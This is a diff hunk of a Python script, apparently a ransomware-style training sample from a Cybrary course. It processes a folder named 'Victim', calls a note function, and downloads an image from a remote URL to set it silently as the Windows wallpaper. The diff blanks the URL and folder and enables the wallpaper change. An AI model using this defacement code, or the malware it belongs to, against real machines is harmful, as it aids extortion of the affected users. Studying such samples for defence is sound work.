@@ -43,14 +43,14 @@ def note():
 
 # Fungsi untuk mengganti wallpaper desktop
 def change_desktop_background():
-    imageUrl = 'https://raw.githubusercontent.com/ArenaldyP/PCAP-File-Analisis-Jalur-Malware/main/output/majomin.jpg'
-    path = os.path.join(os.environ['TEMP'], 'majomin.jpg')
+    imageUrl = ''
+    path = os.path.join(os.environ['TEMP'], 'k1ngp1ng.jpg')
     urllib.request.urlretrieve(imageUrl, path)
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
 
 if __name__ == "__main__":
-    folder_to_process = "J:\Buku 2023\Cybrary\Victim"  # Ganti dengan folder yang ingin diproses
+    folder_to_process = ""  # Ganti dengan folder yang ingin diproses
     process_folder(folder_to_process)
     note()
-    # change_desktop_background()
+    change_desktop_background()
